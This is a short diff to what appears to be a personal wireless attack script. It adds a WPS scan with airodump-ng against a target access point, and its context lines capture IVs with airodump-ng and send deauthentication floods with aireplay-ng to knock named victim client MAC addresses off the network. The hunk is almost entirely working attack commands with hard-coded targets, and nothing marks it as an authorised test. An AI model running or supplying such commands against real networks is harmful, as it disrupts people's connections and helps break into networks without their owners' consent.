@@ -23,6 +23,8 @@ sudo rm -fr *.cap && sudo airodump-ng --ivs --bssid ${tgt} -w ${tgt}.cap wlan1mo
 # Deauth the client
 tgt=8C:18:50:56:2B:28
 
+sudo airodump-ng --wps  wlan1 --bssid ${tgt}
+
 clientvic=14:5F:94:8C:AA:BF
 sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} wlan1mon
 clientvic=74:E2:F5:33:23:D4
